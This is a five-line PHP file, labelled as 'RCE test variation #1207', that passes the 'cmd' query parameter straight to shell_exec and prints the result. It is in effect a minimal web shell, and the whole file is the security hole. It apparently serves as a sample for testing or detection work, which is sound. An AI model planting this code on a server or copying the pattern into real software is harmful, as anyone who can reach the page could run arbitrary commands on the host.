<?php
// RCE test variation #1207
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>